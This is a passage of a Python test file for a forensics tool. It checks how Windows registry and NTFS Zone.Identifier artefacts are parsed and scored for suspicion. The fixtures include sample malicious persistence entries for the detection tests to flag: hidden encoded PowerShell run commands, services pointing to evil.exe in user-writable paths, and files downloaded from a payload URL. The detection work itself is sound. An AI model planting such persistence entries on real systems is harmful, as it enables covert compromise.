        "SourceFile,Hive,KeyPath,ValueName,ValueData,LastWriteTime,SID\n"
        "C:\\Users\\alex\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,Updater,\"powershell.exe -enc aQ==\",2026-05-03T08:05:00Z,S-1-5-21-111-222-333-1001\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "registry_run_key"
    assert doc["process"]["command_line"] == "powershell.exe -enc aQ=="
    assert doc["registry"]["artifact_type"] == "run_key"
    assert doc["user"]["sid"] == "S-1-5-21-111-222-333-1001"
    assert "suspicious" in doc["tags"]
    assert "powershell" in doc["tags"]
    assert any("PowerShell encoded command" in reason for reason in doc["suspicious_reasons"])
    assert doc["raw"]["ValueData"] == "powershell.exe -enc aQ=="


def test_recmd_service_extracts_service_fields(tmp_path: Path) -> None:
    path = tmp_path / "RECmd_Output.csv"
    path.write_text(
        "SourceFile,Hive,KeyPath,ValueName,ValueData,LastWriteTime\n"
        "C:\\Windows\\System32\\config\\SYSTEM,SYSTEM,HKLM\\SYSTEM\\CurrentControlSet\\Services\\BadSvc,ImagePath,C:\\Users\\Public\\svc.exe,2026-05-03T09:00:00Z\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "registry_service"
    assert doc["service"]["name"] == "BadSvc"
    assert doc["service"]["image_path"] == "C:\\Users\\Public\\svc.exe"
    assert doc["process"]["path"] == "C:\\Users\\Public\\svc.exe"


def test_native_service_normalize_svchost_servicedll_normal() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ServiceName": "LegitSvc",
            "ImagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
            "ServiceDll": "C:\\Windows\\System32\\some.dll",
            "StartRaw": 2,
            "Type": "32",
            "ServiceTypeRaw": 32,
            "ObjectName": "LocalSystem",
            "KeyPath": "ControlSet001\\Services\\LegitSvc",
            "ControlSet": "ControlSet001",
            "LastWriteTime": "2026-05-03T09:00:00Z",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert doc["artifact"]["type"] == "service"
    assert doc["event"]["category"] == "persistence"
    assert doc["event"]["type"] == "service"
    assert doc["service"]["service_dll_expanded"] == "C:\\Windows\\System32\\some.dll"
    assert doc["service"]["command_line"] == "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
    assert doc["persistence"]["mechanism"] == "windows_service"
    assert doc["persistence"]["path"] == "C:\\Windows\\System32\\some.dll"
    assert doc["service"]["start_type"] == "auto"
    assert doc["risk_score"] <= 5
    assert doc["suspicious_reasons"] == []
    assert doc["execution"]["is_execution_confirmed"] is False
    assert doc["event"]["timeline_include"] is False


def test_native_service_normalize_appdata_autostart_suspicious() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ServiceName": "BadSvc",
            "ImagePath": "C:\\Users\\dfir\\AppData\\Roaming\\updater.exe",
            "StartRaw": 2,
            "KeyPath": "ControlSet001\\Services\\BadSvc",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert doc["risk_score"] >= 40
    assert "Service executable path is user-writable" in doc["suspicious_reasons"]
    assert "Autostart service uses suspicious path" in doc["suspicious_reasons"]
    assert "service_autostart" in doc["tags"]


def test_native_service_normalize_powershell_encoded() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ServiceName": "PSvc",
            "ImagePath": "powershell.exe -NoP -EncodedCommand AAAA",
            "StartRaw": 3,
            "KeyPath": "ControlSet001\\Services\\PSvc",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert "Service uses LOLBin in ImagePath" in doc["suspicious_reasons"]
    assert "Service command contains encoded PowerShell" in doc["suspicious_reasons"]
    assert doc["risk_score"] >= 50


def test_native_service_normalize_svchost_with_suspicious_servicedll() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ServiceName": "DllSvc",
            "ImagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
            "ServiceDll": "C:\\Users\\Public\\evil.dll",
            "StartRaw": 2,
            "KeyPath": "ControlSet001\\Services\\DllSvc",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert "Service DLL path is suspicious" in doc["suspicious_reasons"]
    assert doc["risk_score"] >= 40


def test_native_service_normalize_disabled_service_not_suspicious() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ServiceName": "DormantSvc",
            "ImagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
            "StartRaw": 4,
            "KeyPath": "ControlSet001\\Services\\DormantSvc",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert doc["persistence"]["enabled"] is False
    assert "disabled_service" in doc["tags"]
    assert doc["risk_score"] <= 5


def test_native_service_normalize_no_bad_escape_for_windows_paths() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ServiceName": "EventLog",
            "ImagePath": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
            "ServiceDll": "%SystemRoot%\\System32\\wevtsvc.dll",
            "StartRaw": 2,
            "KeyPath": "ControlSet001\\Services\\EventLog",
            "LastWriteTime": "2026-05-03T09:00:00Z",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert doc["service"]["image_path_expanded"] == "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p"
    assert doc["service"]["service_dll_expanded"] == "C:\\Windows\\System32\\wevtsvc.dll"
    assert doc["suspicious_reasons"] == []


def test_native_service_defender_paths_not_marked_suspicious() -> None:
    for service_name, image_path in [
        ("WinDefend", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26040.2-0\\MsMpEng.exe"),
        ("MDCoreSvc", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26040.2-0\\MpDefenderCoreService.exe"),
    ]:
        doc = normalize_row(
            "case-1",
            "ev-1",
            "art-1",
            {
                "ServiceName": service_name,
                "ImagePath": image_path,
                "StartRaw": 2,
                "KeyPath": f"ControlSet001\\Services\\{service_name}",
                "LastWriteTime": "2026-05-03T09:00:00Z",
                "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
            },
            {
                "artifact_type": "service",
                "name": "Windows Service raw - SYSTEM",
                "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
                "parser": "windows_service_registry",
                "source_tool": "native_windows_service",
                "source_format": "registry_hive",
            },
        )
        assert doc["risk_score"] == 0
        assert "Service executable path is user-writable" not in doc["suspicious_reasons"]
        assert "Autostart service uses suspicious path" not in doc["suspicious_reasons"]


def test_native_service_programdata_random_is_suspicious() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ServiceName": "RandomSvc",
            "ImagePath": "C:\\ProgramData\\Random\\evil.exe",
            "StartRaw": 2,
            "KeyPath": "ControlSet001\\Services\\RandomSvc",
            "LastWriteTime": "2026-05-03T09:00:00Z",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
        },
    )
    assert doc["risk_score"] >= 40
    assert "Service executable path is user-writable" in doc["suspicious_reasons"]


def test_native_service_without_last_write_does_not_use_processed_at() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ServiceName": "NoTimeSvc",
            "ImagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
            "StartRaw": 2,
            "KeyPath": "ControlSet001\\Services\\NoTimeSvc",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
            "SourceMtime": "2026-05-14T10:00:00Z",
        },
        {
            "artifact_type": "service",
            "name": "Windows Service raw - SYSTEM",
            "source_path": "C:\\Windows\\System32\\config\\SYSTEM",
            "parser": "windows_service_registry",
            "source_tool": "native_windows_service",
            "source_format": "registry_hive",
            "parser_processed_at": "2026-05-14T12:00:00Z",
        },
    )
    assert doc["@timestamp"] is None
    assert doc["timestamp_precision"] == "unknown"
    assert doc["event"]["timeline_include"] is False
    assert doc["ingest"]["processed_at"] == "2026-05-14T12:00:00+00:00"


def test_recmd_userassist_decodes_rot13(tmp_path: Path) -> None:
    path = tmp_path / "RECmd_Output.csv"
    path.write_text(
        "SourceFile,Hive,KeyPath,ValueName,ValueData,LastWriteTime,RunCount,FocusTime,LastRun,UserName,SID\n"
        "C:\\Users\\alex\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{GUID}\\Count,P:\\Hfref\\nyrk\\NccQngn\\Grzc\\rivy.rkr,,2026-05-03T10:00:00Z,7,120,2026-05-03T10:01:00Z,alex,S-1-5-21-111-222-333-1001\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["artifact"]["type"] == "user_activity"
    assert doc["artifact"]["parser"] == "userassist_registry"
    assert doc["event"]["type"] == "user_program_execution_observed"
    assert doc["process"]["path"] == "C:\\Users\\alex\\AppData\\Temp\\evil.exe"
    assert doc["execution"]["run_count"] == 7
    assert doc["execution"]["focus_time"] == 120
    assert doc["execution"]["is_execution_confirmed"] is True


def test_recmd_bam_extracts_process_and_sid(tmp_path: Path) -> None:
    path = tmp_path / "RECmd_Output.csv"
    path.write_text(
        "SourceFile,Hive,KeyPath,ValueName,ValueData,LastWriteTime\n"
        "C:\\Windows\\System32\\config\\SYSTEM,SYSTEM,HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-111-222-333-1001,C:\\Users\\alex\\AppData\\Local\\Temp\\evil.exe,C:\\Users\\alex\\AppData\\Local\\Temp\\evil.exe,2026-05-03T10:10:00Z\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["artifact"]["type"] == "user_activity"
    assert doc["artifact"]["parser"] == "bam_dam_registry"
    assert doc["event"]["type"] == "background_app_execution_observed"
    assert doc["process"]["path"] == "C:\\Users\\alex\\AppData\\Local\\Temp\\evil.exe"
    assert doc["process"]["name"] == "evil.exe"
    assert doc["user"]["sid"] == "S-1-5-21-111-222-333-1001"
    assert "evil.exe" in doc["event"]["message"]
    assert "evil.exe" in doc["search_text"]


def test_recmd_muicache_low_confidence_entry(tmp_path: Path) -> None:
    path = tmp_path / "RECmd_Output.csv"
    path.write_text(
        "SourceFile,Hive,KeyPath,ValueName,ValueData,LastWriteTime\n"
        "C:\\Users\\alex\\UsrClass.dat,UsrClass.dat,HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache,C:\\Users\\alex\\AppData\\Local\\evil.exe,Evil App,2026-05-03T10:20:00Z\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "muicache_entry"
    assert doc["execution"]["confidence"] == "low"
    assert doc["process"]["display_name"] == "Evil App"


def test_recmd_usb_and_mounted_devices_extract_fields() -> None:
    path = Path(__file__).parent / "fixtures" / "recmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    usb_doc = next(doc for doc in docs if doc["event"]["type"] == "usb_device_seen")
    mounted_doc = next(doc for doc in docs if doc["event"]["type"] == "mounted_device")
    assert usb_doc["usb"]["vendor"] == "SanDisk"
    assert usb_doc["usb"]["product"] == "Ultra"
    assert usb_doc["usb"]["serial"] == "123ABC456"
    assert mounted_doc["volume"]["drive_letter"] == "E:"


def test_recmd_misc_subtypes_and_search_text() -> None:
    path = Path(__file__).parent / "fixtures" / "recmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    typed_path = next(doc for doc in docs if doc["event"]["type"] == "user_typed_path_observed")
    run_mru = next(doc for doc in docs if doc["event"]["type"] == "user_run_command_observed")
    recent_doc = next(doc for doc in docs if doc["event"]["type"] == "user_recent_document_observed")
    rdp_mru = next(doc for doc in docs if doc["event"]["type"] == "rdp_mru")
    shellbag_doc = next(doc for doc in docs if doc["event"]["type"] == "user_folder_access_observed")
    generic_doc = next(doc for doc in docs if doc["event"]["type"] == "registry_value")
    assert typed_path["artifact"]["type"] == "user_activity"
    assert run_mru["artifact"]["type"] == "user_activity"
    assert recent_doc["artifact"]["type"] == "user_activity"
    assert shellbag_doc["artifact"]["type"] == "user_activity"
    assert typed_path["file"]["path"] == "C:\\Users\\alex\\Downloads"
    assert run_mru["process"]["command_line"] == "powershell.exe -enc aQ=="
    assert recent_doc["file"]["path"] == "C:\\Users\\alex\\Documents\\report.docx"
    assert rdp_mru["destination"]["hostname"] == "rdp.lab.local"
    assert shellbag_doc["shellbag"]["path"] == "C:\\Users\\alex\\Desktop\\SecretFolder"
    assert generic_doc["registry"]["artifact_type"] == "registry_generic"
    assert "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" in run_mru["search_text"]
    assert "run_mru" in run_mru["search_text"]
    assert run_mru["raw"]["ValueData"] == "powershell.exe -enc aQ=="
    assert "Registry value:" in generic_doc["event"]["message"]
    assert "Value=" in generic_doc["raw_summary"]
    assert "Data=" in generic_doc["raw_summary"]
    assert "registry_generic" in generic_doc["search_text"]
    assert generic_doc["registry"]["key_path"] in generic_doc["search_text"]
    assert generic_doc["registry"]["value_name"] in generic_doc["search_text"]
    assert generic_doc["registry"]["value_data"] in generic_doc["search_text"]


def test_recmd_fixture_integration() -> None:
    path = Path(__file__).parent / "fixtures" / "recmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    assert len(docs) >= 10
    types = {doc["event"]["type"] for doc in docs}
    assert {"registry_run_key", "registry_service", "user_program_execution_observed", "background_app_execution_observed", "usb_device_seen", "mounted_device", "user_typed_path_observed", "user_run_command_observed", "user_recent_document_observed", "rdp_mru", "user_folder_access_observed", "registry_value"}.issubset(types)
    assert any("suspicious" in doc["tags"] for doc in docs)
    assert all("raw" in doc for doc in docs)


def test_recmd_user_activity_scoped_types_are_specific() -> None:
    document = {
        "artifact": {"type": "user_activity", "parser": "run_mru_registry"},
        "process": {"command_line": "powershell.exe -NoP", "path": "powershell.exe", "name": "powershell.exe"},
        "registry": {"value_data": "powershell.exe -NoP"},
        "file": {},
        "user": {},
        "search_text": "run_mru powershell.exe -NoP",
    }
    scoped = _retarget_user_activity_document(document, artifact_type="runmru", source_path="HOSTA/C/Users/alex/NTUSER.DAT", profile_user="alex")
    assert scoped["artifact"]["type"] == "runmru"
    assert scoped["artifact"]["source_path"] == "HOSTA/C/Users/alex/NTUSER.DAT"
    assert scoped["user"]["name"] == "alex"
    assert scoped["command"] == "powershell.exe -NoP"
    assert scoped["key_entity"] == "powershell.exe -NoP"


def test_recmd_user_activity_hive_discovery_uses_metadata_and_archives(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from app.ingest.raw_parsers import recmd_backend

    def fake_root(case_id: str, evidence_id: str) -> Path:
        return tmp_path

    monkeypatch.setattr(recmd_backend, "build_evidence_root", fake_root)
    monkeypatch.setattr(recmd_backend, "evidence_staging_dir", lambda case_id, evidence_id: tmp_path / "staging")
    monkeypatch.setattr(recmd_backend, "_archive_paths", lambda archive: ["HOSTA/C/Users/alex/NTUSER.DAT", "HOSTA/C/Windows/ServiceProfiles/LocalService/NTUSER.DAT"])
    (tmp_path / "original").mkdir()
    (tmp_path / "original" / "HOSTA.7z").write_text("placeholder", encoding="utf-8")
    metadata = {"ingest_plan": {"disabled_candidates": [{"source_path": "HOSTA/C/Users/bob/AppData/Local/Microsoft/Windows/UsrClass.dat"}]}}
    hives = find_user_activity_hives("case-1", "ev-1", metadata)
    source_paths = {item["source_path"] for item in hives}
    assert "HOSTA/C/Users/bob/AppData/Local/Microsoft/Windows/UsrClass.dat" in source_paths
    assert "HOSTA/C/Users/alex/NTUSER.DAT" in source_paths
    assert all("ServiceProfiles" not in item["source_path"] for item in hives)


def test_user_activity_registry_v1_parses_office_mru_trustrecords_and_featureusage(tmp_path: Path) -> None:
    path = tmp_path / "RECmd_UserActivity.csv"
    path.write_text(
        "SourceFile,Hive,KeyPath,ValueName,ValueData,LastWriteTime,UserName,SID\n"
        "C:\\Users\\user01\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\FileMRU,a,[F00000000][T01D000000000000]*C:\\Users\\user01\\Downloads\\invoice.docm,2026-05-03T11:00:00Z,user01,S-1-5-21-111-222-333-1001\n"
        "C:\\Users\\user01\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU\\docm,a,C:\\Users\\user01\\Downloads\\invoice.docm,2026-05-03T11:05:00Z,user01,S-1-5-21-111-222-333-1001\n"
        "C:\\Users\\user01\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Documents\\TrustRecords,C:\\Users\\user01\\Downloads\\invoice.docm,01020304,2026-05-03T11:10:00Z,user01,S-1-5-21-111-222-333-1001\n"
        "C:\\Users\\user01\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppLaunch,powershell.exe,12,2026-05-03T11:15:00Z,user01,S-1-5-21-111-222-333-1001\n",
        encoding="utf-8",
    )
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    office_doc = next(doc for doc in docs if doc["artifact"]["parser"] == "office_recent_docs_registry")
    opensave_doc = next(doc for doc in docs if doc["artifact"]["parser"] == "opensave_mru_registry")
    trust_doc = next(doc for doc in docs if doc["event"]["type"] == "office_document_trusted")
    feature_doc = next(doc for doc in docs if doc["artifact"]["parser"] == "featureusage_registry")
    assert office_doc["artifact"]["type"] == "user_activity"
    assert office_doc["file"]["path"] == "C:\\Users\\user01\\Downloads\\invoice.docm"
    assert office_doc["office"]["app"] == "Word"
    assert office_doc["risk_score"] >= 40
    assert opensave_doc["event"]["type"] == "user_file_dialog_observed"
    assert trust_doc["office"]["trusted_document"] is True
    assert trust_doc["office"]["macro_trust_possible"] is True
    assert trust_doc["risk_score"] >= 70
    assert feature_doc["event"]["type"] == "user_app_usage_observed"
    assert feature_doc["execution"]["run_count"] == 12


def test_user_activity_registry_v1_high_signal_items_score_for_findings(tmp_path: Path) -> None:
    path = tmp_path / "RECmd_UserActivity_HighSignal.csv"
    path.write_text(
        "SourceFile,Hive,KeyPath,ValueName,ValueData,LastWriteTime,UserName,SID,RunCount\n"
        "C:\\Users\\user01\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU,a,powershell.exe -NoP -W Hidden -EncodedCommand AAAA,2026-05-03T10:00:00Z,user01,S-1-5-21-111-222-333-1001,\n"
        "C:\\Users\\user01\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{GUID}\\Count,P:\\Hfref\\hfre01\\NccQngn\\Ebnzvat\\rivy.cf1,,2026-05-03T10:05:00Z,user01,S-1-5-21-111-222-333-1001,5\n"
        "C:\\Windows\\System32\\config\\SYSTEM,SYSTEM,HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-111-222-333-1001,C:\\Users\\user01\\AppData\\Local\\Temp\\payload.exe,C:\\Users\\user01\\AppData\\Local\\Temp\\payload.exe,2026-05-03T10:10:00Z,,S-1-5-21-111-222-333-1001,\n"
        "C:\\Users\\user01\\NTUSER.DAT,NTUSER.DAT,HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Documents\\TrustRecords,C:\\Users\\user01\\Downloads\\invoice.docm,01020304,2026-05-03T10:15:00Z,user01,S-1-5-21-111-222-333-1001,\n",
        encoding="utf-8",
    )
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "registry", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    run_doc = next(doc for doc in docs if doc["event"]["type"] == "user_run_command_observed")
    userassist_doc = next(doc for doc in docs if doc["artifact"]["parser"] == "userassist_registry")
    bam_doc = next(doc for doc in docs if doc["artifact"]["parser"] == "bam_dam_registry")
    trust_doc = next(doc for doc in docs if doc["event"]["type"] == "office_document_trusted")
    assert run_doc["risk_score"] >= 70
    assert userassist_doc["risk_score"] >= 70
    assert bam_doc["risk_score"] >= 70
    assert trust_doc["risk_score"] >= 70


def test_user_activity_registry_raw_hive_inventory_is_non_fatal(tmp_path: Path) -> None:
    path = tmp_path / "NTUSER.DAT"
    path.write_text("placeholder", encoding="utf-8")
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "user_activity", "name": path.name, "source_path": str(path), "parser": "user_activity_registry_raw"})
    assert len(docs) == 1
    doc = docs[0]
    assert doc["artifact"]["type"] == "user_activity"
    assert doc["artifact"]["parser"] == "user_activity_registry_raw"
    assert doc["event"]["type"] == "user_activity_registry_hive_observed"
    assert "raw_hive_inventory_only" in doc["data_quality"]


def test_user_activity_raw_hives_are_classified_for_ingest() -> None:
    classification = classify_artifact(Path("NTUSER.DAT"))
    assert classification["artifact_type"] == "user_activity"
    assert classification["parser"] == "user_activity_registry_raw"


def test_user_activity_debug_export_reports_are_populated() -> None:
    events = [
        {
            "id": "ua-1",
            "artifact": {"type": "user_activity", "parser": "run_mru_registry"},
            "event": {"type": "user_run_command_observed", "action": "run_dialog_command"},
            "user": {"name": "user01", "sid": "S-1-5-21-111"},
            "user_activity": {"kind": "run_dialog_command"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\invoice.docm"},
            "process": {"command_line": "powershell.exe -enc AAAA"},
            "risk_score": 90,
            "tags": ["user_activity", "suspicious"],
            "source_file": "runmru.csv",
        },
        {
            "id": "ua-2",
            "artifact": {"type": "user_activity", "parser": "office_trustrecords_registry"},
            "event": {"type": "office_document_trusted"},
            "user": {"name": "user01"},
            "user_activity": {"kind": "office_trusted_document"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\invoice.docm"},
            "office": {"app": "Word", "trusted_document": True, "macro_trust_possible": True},
            "risk_score": 85,
            "tags": ["user_activity", "trusted_document"],
            "source_file": "trustrecords.csv",
        },
        {
            "id": "ua-3",
            "artifact": {"type": "user_activity", "parser": "user_activity_registry_raw"},
            "event": {"type": "user_activity_registry_hive_observed"},
            "user": {"name": "user01"},
            "user_activity": {"kind": "raw_hive_inventory"},
            "file": {"path": "C:\\Users\\user01\\NTUSER.DAT"},
            "risk_score": 0,
            "tags": ["user_activity", "registry_hive_raw"],
            "source_file": "NTUSER.DAT",
        },
    ]
    report = _build_user_activity_parse_report([], [], events, selected_artifact_types=["user_activity"], scope="case")
    sample = _build_user_activity_sample_events(events)
    assert report["records_indexed"] == 3
    assert report["by_parser"]["run_mru_registry"] == 1
    assert report["by_activity_type"]["run_dialog_command"] == 1
    assert report["suspicious_command_count"] == 1
    assert report["trusted_office_document_count"] == 1
    assert report["unsupported_raw_hive_count"] == 1
    assert len(sample) == 3


def test_user_activity_correlation_creates_only_high_signal_findings(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Case Alpha")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="user_activity.zip", stored_path="user_activity.zip", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    session = _CorrelationSession(case, [evidence])
    events = [
        {
            "id": "ua-run-1",
            "event_id": "ua-run-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:00:00+00:00",
            "artifact": {"type": "user_activity", "parser": "run_mru_registry"},
            "event": {"type": "user_run_command_observed", "action": "run_dialog_command"},
            "process": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "name": "powershell.exe", "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand AAAA"},
            "user": {"name": "user01", "sid": "S-1-5-21-111"},
            "risk_score": 92,
            "tags": ["user_activity", "suspicious"],
            "suspicious_reasons": ["Registry command contains PowerShell encoded command"],
        },
        {
            "id": "ua-trust-1",
            "event_id": "ua-trust-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:10:00+00:00",
            "artifact": {"type": "user_activity", "parser": "office_trustrecords_registry"},
            "event": {"type": "office_document_trusted"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\invoice.docm", "name": "invoice.docm", "extension": ".docm"},
            "office": {"app": "Word", "trusted_document": True, "macro_trust_possible": True},
            "user": {"name": "user01"},
            "risk_score": 88,
            "tags": ["user_activity", "trusted_document"],
            "suspicious_reasons": ["Trusted macro-enabled Office document observed"],
        },
        {
            "id": "ua-shell-1",
            "event_id": "ua-shell-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:20:00+00:00",
            "artifact": {"type": "user_activity", "parser": "shellbags_registry"},
            "event": {"type": "user_folder_access_observed"},
            "folder": {"path": "C:\\Users\\user01\\Desktop"},
            "risk_score": 10,
            "tags": ["user_activity", "folder_access"],
            "suspicious_reasons": [],
        },
    ]
    monkeypatch.setattr("app.services.correlation_engine._iter_events_for_case", lambda case_id, evidence_id=None: events)
    monkeypatch.setattr("app.services.correlation_engine.build_process_tree_bundle", lambda *args, **kwargs: {"graph": {"nodes": [], "edges": [], "summary": {}}})
    result = run_correlation_engine(session, "case-1")
    finding_types = {item["finding_type"] for item in result["findings"]}
    assert "user_executed_suspicious_command" in finding_types
    assert "trusted_office_macro_document" in finding_types
    assert "user_activity_suspicious_program" not in finding_types


def test_ntfs_zone_identifier_and_usn_are_normalized(tmp_path: Path) -> None:
    zone_path = tmp_path / "zone_identifier.csv"
    zone_path.write_text(
        "FilePath,ZoneId,HostUrl,ReferrerUrl,SourceFile\n"
        "C:\\Users\\user01\\Downloads\\payload.exe,3,http://203.0.113.10/payload.exe,http://suspicious.example/,zone_identifier.csv\n"
        "C:\\Users\\user01\\Downloads\\report.pdf,3,https://example.com/report.pdf,,zone_identifier.csv\n"
        "C:\\Users\\user01\\Downloads\\invoice.pdf.exe,4,http://bad.example/invoice.pdf.exe,,zone_identifier.csv\n",
        encoding="utf-8",
    )
    docs = normalize_file("case-1", "ev-1", "art-1", zone_path, {"artifact_type": "ntfs", "name": zone_path.name, "source_path": str(zone_path), "parser": "ntfs_ads_zone_identifier"})
    payload = next(doc for doc in docs if doc["file"]["name"] == "payload.exe")
    report = next(doc for doc in docs if doc["file"]["name"] == "report.pdf")
    double_ext = next(doc for doc in docs if doc["file"]["name"] == "invoice.pdf.exe")
    assert payload["artifact"]["type"] == "ntfs"
    assert payload["event"]["type"] == "file_zone_identifier_observed"
    assert payload["ntfs"]["zone_id"] == 3
    assert payload["ntfs"]["host_url"] == "http://203.0.113.10/payload.exe"
    assert payload["risk_score"] >= 85
    assert "Downloaded executable or script marked with web origin" in payload["suspicious_reasons"]
    assert report["risk_score"] < payload["risk_score"]
    assert double_ext["ntfs"]["zone_id"] == 4
    assert double_ext["risk_score"] >= 90
    assert "Downloaded double-extension file" in double_ext["suspicious_reasons"]
    assert "203.0.113.10" in payload["search_text"]

    usn_path = tmp_path / "usnjrnl.csv"
